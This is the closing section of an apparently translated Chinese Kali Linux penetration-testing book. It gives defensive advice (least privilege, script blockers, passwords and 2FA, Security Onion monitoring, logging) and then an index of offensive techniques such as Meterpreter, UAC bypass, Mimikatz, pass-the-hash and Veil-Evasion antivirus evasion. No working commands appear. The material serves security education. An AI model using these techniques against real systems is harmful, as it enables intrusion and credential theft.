永远不要在日常非管理任务中使用特权凭据。极力限制“Root”和“Administrator”（管理员）级的使用。在 Windows 系统上，将受损的管理员账户提升到神一般的“System”级账户几乎轻而易举。如果受损账户仅处于“user”（用户）级，就会困难得多。系统管理员应在执行管理功能时使用管理员级权限，执行普通计算功能时切换回非管理员账户。

## 使用脚本拦截程序

许多现代用户使用某种程度 Web 脚本语言。使用如 Giorgio Maio 开发的 Mozilla 插件“NoScript”之类的脚本拦截程序；这是阻止许多威胁的简单方法。NoScript 阻止脚本在你访问的任何新网站上自动运行。它还让你很容易允许某些脚本运行，或完全将某个网站加入白名单。NoScript 会记住你的设置，因此当你访问经常的站点时，脚本将被拦截或允许。我也喜欢 José María Signan 和 Felix Shnir 开发的 Mozilla 插件“Ghostery”。Ghostery 允许你阻止网站上的跟踪、分析和不受欢迎广告。

最后，启用浏览器的安全隐私功能。不要让它们存储密码或历史记录。在可行的情况下使用 Bleachit 之类的程序清理缓存。

## 密码与双重身份验证 (2FA)

这不言而喻，但不仅是对你的计算机系统（以及在线设备！），使用长密码。密码越长越复杂，攻击者破解所需的时间就越长。使用大写和小字母、数字和符号的组合。许多安全专家建议使用密码管理器以确保每个站点都有不同的安全密码。我个人不推荐使用这些，因为它们过去出现过安全问题，而且如果黑客访问了密码管理器，就能获取所有的密码。

在一次安全评估中，我发现一个客户使用人的名字作为 Web 应用管理员密码！我用于测试 Web 应用密码强度的程序在几秒钟内破解了它。我的密码没有短于 16 个字符的，重要的密码更大。为每个在线账户使用不同的密码，这样即使一个账户被攻破，攻击者无法利用它访问你拥有的其他账户。

我之前提到过，但在可用时使用多种身份验证类型。在密码的基础上使用口令或生物识别认证等辅助方法，比单独使用密码要安全得多。由于“SIM 劫持”的增加，许多人不再认为身份验证是保护账户的安全方法。SIM 劫持是指社会工程师通过欺骗服务提供商声称要更换新 SIM 卡来接管目标的手机。如果成功，黑客就可以访问 2FA 短信以及任何与号码绑定的内容。在你的手机账户上设置保护性 PIN 码可以防止这种情况，以及使用身份验证 App。

## 网络安全监控

我是网络安全监控（NSM）的忠实粉丝。如果你运行网络却不知道那是什么，请跑（不要走）去买 Richard Bejtlich 写的《The Tao of Network Security Monitoring, Beyond Intrusion Detection》。基本上，NSM 是一种捕获你所有网络流量（有时在网络中的多个点进行）并对其进行入侵或异常分析的系统。如果


如果你认为你负担得起 NSM 系统，请重新考虑一下。最常用的系统之一其实是免费的！由 Doug Burks 创建的“Security Onion” 是一个功能极其强大且功能丰富的 NSM，而且它是完全免费的。你只需要一台性能相当的电脑来运行它，以及至少两个网卡。

Security Onion 允许你捕获网络流量，然后对其进行问题分析，并在易于使用的界面中通过警报通知你。以下是 Security Onion 运行的几张截图。第一张显示了由于网络上的系统使用了“Autopwn”触发的一系列警报：

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_398_0.png)

你可以看到有多个警告和警报。最后一行记录了某次警报（CNT 列） 172 次事件！Security Onion 还能捕获你网络上的 TOR。TOR 是一种匿名协议，它使用加密通信在全球范围内跳转，以帮助用户匿名化。TOR 可用于善意，但黑客也使用 TOR 来隐藏他们的攻击。以下是我在受 Security Onion 监控的测试网络中使用 TOR 时发生的情况：

## 应用场景

SGUIL:0.5.0 - 已连接到 localhost
文件查询报告声音：关闭 服务器名称:local 用户:2

| ST | CNT | Alert ID | Time | Src IP | D Port | D... | DPrt | Event Message |
|---|---|---|---|---|---|---|---|---|
| 1 | 6870 | 2022-09-23 21:59:54 | 0.0.0.0 | | 0.0.0.0 | 0 | [OSSEC] Dpkg (Debian Package) Installed |
| 2 | 6879 | 2022-09-23 21:25:24 | 0.0.0.0 | | 0.0.0.0 | 0 | [OSSEC] 校验和已更改（第 2 次）。 |
| 1 | 3602 | 2022-09-23 21:17:55 | 192.168.1.1 | 443 | | 5068 | ET TOR Known Tor Exit Node Traffic (5) |
| 2 | 3603 | 2022-09-23 21:17:55 | 192.168.1.1 | 443 | | 5068 | ET TOR Known Tor Exit Node Traffic (7) |
| 1 | 3654 | 2022-09-23 21:17:32 | 192.168.1.1 | 443 | | 19242 | ET TOR Known Tor Exit Node Traffic (10) |
| 1 | 3665 | 2022-09-23 21:17:30 | 192.168.1.1 | 443 | | 42039 | ET TOR Known Tor Exit Node Traffic (57) |
| 1 | 3667 | 2022-09-23 21:17:33 | 192.168.1.1 | 443 | | 60728 | ET TOR Known Tor Exit Node Traffic (19) |
| 1 | 3668 | 2022-09-23 21:17:33 | 192.168.1.1 | 443 | | 60061 | ET TOR Known Tor Exit Node Traffic (38) |
| 1 | 3669 | 2022-09-23 21:37:10 | 192.168.1.1 | 443 | | 49824 | ET TOR Known Tor Exit Node Traffic (35) |
| 2 | 3670 | 2022-09-23 21:17:30 | 192.168.1.1 | 443 | | 19805 | ET TOR Known Tor Exit Traffic (2) |
| 1 | 3671 | 2022-09-23 21:17:28 | 192.168.1.1 | 443 | | 21018 | ET TOR Known Tor Exit Node Traffic (80) |

注意到产生了多个黄色的“Known TOR Exit Node Traffic”警报。Security Onion 提供了一些功能和工具，使得分析和跟踪网络流量变得简单得多，并在发现可疑流量时提醒你。在执行各种攻击时在你的测试实验室运行 Security Onion 是一种良好的做法（也是一种学习体验），可以看到哪些被检测到了，更重要的是哪些没有被检测到。

## 日志

这基本上是上一个内容的延续。确保在关键交换机、路由器、防火墙和系统上开启了安全日志。最好让关键设备和系统将安全日志发送 syslog 服务器，这样你就可以有一份备份（防止黑客擦除系统日志），并在最坏的情况发生时让事件响应及时知情。




# 索引

## A
- 添加 API 密钥 · 42
- Aircrack-ng · 354
- Airmon-NG · 340
- 反病毒软件 · 152
- 反病毒软件/网络安全程序 · 399
- Apache Web 服务器 · 186
- apt-get dist-upgrade · 32
- apt-get update · 32
- ARP 攻击 · 195
- ARP 毒化 · 195
- ARP 表 · 179
- 自动目标 · 94

## B
- 基础 Meterpreter 命令 · 109
- BeEF hook 脚本 · 203
- 蓝牙设备破解 · 379
- 蓝牙低功设备 · 380
- 蓝牙扫描 · 379
- 浏览器利用框架 (Browser Exploitation Framework) · 201
- 绕过 UAC · 165

## C
- 强制门户 (Captive Portal) · 359
- CeWL · 270
- 动态修改 HREFS · 298
- CHECKVM · 125
- CLEAREV · 117
- 破解更复杂的密码 · 284
- 在线破解 LM 密码 · 251
- 破解 WPA 握手文件 · 354
- CrackStation · 276
- Crunch · 271, 272

## D
- Dmitry · 75
- 从网络下载字典列表 · 275

## E
- 伦理黑客问题 · 4
- 漏洞选项 · 91
- 漏洞 (exploits) · 87

## F
- Fern WIFI 破解器 · 348
- 文件系统命令 · 112
- 查找我的哈希 (Find my hash) · 253
- 防墙与 IPS · 399

## G
- Getlwd · 114
- GETPID · 118
- sgetsystem · 165, 168, 175
- Ghostery · 400
- Google Dorks · 52

## H
- Hashcat · 278, 280, 281, 284, 286, 287, 288, 290
- Hashcat · 278
- hashdump · 168, 258
- hcitool 工具 · 379
- Hydra · 298

## I
- 在 VMware 上安装 Kali · 7
- ipipconfig · 21, 116

## J
- Java PYInjector 攻击 · 237
- John the Ripper · 217, 249, 254, 269, 278, 279, 289, 291, 292, 296, 302, 317
- JS 记录logger攻击 · 198

## K
- Kali Pi 和 Mana-Toolkit · 377
- Kali-Pi · 371
- kalipi-config · 375
- 记录器 (keylogger) · 194
- Keyscan · 320
- 带有锁定记录器的 KeyScan · 323
- Kismet · 362, 367

## L
- Lcd · 114
- 限制服务与权限级别 · 400
- Linux 密码 · 293
- LM 哈希 · 247, 248, 249, 252, 254, 255
- LM 哈希 · 249
- 锁定记录器 · 320
- 日志 · 403
- 长复杂密码 · 400
- ipwd · 114
- lisa_dump · 304

## M
- MacChanger · 346
- Mana · 357, 377
- 人间中间攻击 (Man-in-the-Middle Attacks) · 178
- 人间中间攻击框架 · 193
- 邮件发送工具 · 235
- Medusa · 300
- 元软件包 (Metapackages) · 381
- Metasploit · 25, 34, 53, 55, 65, 68, 70, 72, 83, 84, 85, 86, 87, 88, 91, 93, 96, 97, 100, 103, 105, 107, 120, 130, 131, 135, 136, 137, 141, 142, 143, 151, 155, 157, 165, 176, 178, 181, 209, 238, 239, 243, 257, 258, 259, 293, 298, 302, 303, 307, 318, 320, 325, 326, 328, 339, 66, 15, 16, 18, 21, 76, 92, 93, 131, 132, 139, 142, 149, 150, 293, 297, 404
- Metasploit · 2, 15
- Meterpreter shell · 109
- Mimikatz · 303, 307, 314, 315, 317, 318
- MitM · 193, 195, 198, 203, 192, 347
- 多重继 (Multi-Relay) · 212, 213, 214, 219, 220, 221, 222, 223, 228, 230
- MySQL · 144, 145

## N
- NAT · 9
- Netcrack · 301
- Netdiscover · 79
- Nethunter · 2, 193, 212, 213, 228, 387, 389, 390, 391, 392, 393, 396
- Nethunter Terminal · 201
- 网络命令 · 116
- 网络防御 · 398
- 网络监控 · 401
- 网络监控 (NSM) · 401
- nmap · 80, 132, 133, 134, 141, 142, 151, 169
- NoScript · 400
- NT 哈希 · 247
- NTLM 哈希 · 247
- NTLMv1 · 247
- NTLMv2 · 247

## O
- 对象安全 · 251

## P
- NTLMv1 · 381, 382, 383, 384, 385, 387, 388
- 数据包捕获 (Packet Capture) · 181
- 传递哈希 (Pass the Hash) · 255
- 哈希传递工具包 · 261
- 补丁与更新 · 398
- 负载 (Payload) · 96
- 负载载布局 (Payload Layout) · 97
- 选取漏洞 · 87
- PowerShell · 102, 130, 110, 155, 234, 237, 238, 239, 242, 243, 246, 329, 403
- PowerShell 攻击 · 242

## R
- Raspberry Pi · 370
- Recon's Kali-Pi · 270
- Recon's Kali-Pi on Raspberry Pi 3 · 371
- Recon-NG · 34
- 从受损站点恢复数据 · 43
- 从远程系统恢复删除的文件 · 169
- 从锁定的工作站恢复密码 · 313
- 远程会话 · 100
- 远程 shell · 93, 101
- Responder · 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 227, 228, 229, 230, 231, 247, 255, 256
- RHOST · 91
- Mana 伪造 WiFi 路由器攻击 · 357
- 路由器利用框架 · 336
- Routerpwn · 334
- RouterSploit · 336
- R · 91
- 运行脚本 · 125

## S
- Samba (SMB) 服务 · 149
- 扫描器 · 142
- 扫描地址范围 · 147
- 扫描目标 · 132
- 本书范围 · 4
- 截图 · 123
- 截图 · 120
- 脚本拦截程序 · 400
- Sensepost's Mana · 357
- 在 Metasploit 中设置选项 · 91
- 设置负载选项 · 98
- 设置 Kali IP 地址 · 11
- Shodan · 34, 42, 51, 52, 53, 54, 55, 56, 57, 58, 60, 61, 62, 64, 65, 66, 67, 68, 69, 70, 72, 140
- 使用 Metasploit 搜索 Shodan · 70
- Skull Security · 276
- 快照 (snapshot) · 123
- 社会工程学 · 232
- 社会工程学工具 (SET) · 234
- 录音 (SOUND RECORDING) · 124
- Sparta · 76
- SSH 服务器 · 144
- 系统命令 · 116

## T
- 目标 ID · 95
- 目标类型 · 93
- TELNET · 145
- TOR · 402

## U
- Unreal IRC · 135
- unshadow · 296
- 升级 · 32
- 上游 · 180
- 使用 Metasploit · 131
- Utilman · 307, 310

## V
- Veil 框架 · 151, 152
- Veil-Evasion · 152, 153, 154, 155, 156, 163
- 虚拟机 · 6
- VMware 工具 · 15

## W
- Web 交付 · 101
- 摄像头 (webcam) · 120
- Wifite · 353
- Windows 10 · 18, 149, 159
- Windows 权限提升 · 165
- 无线网络 · 332
- Wireshark · 178, 184, 342, 343, 344
- 字典列表生成工具 · 270
- 字典列表 · 267

## X
- Xplico · 186

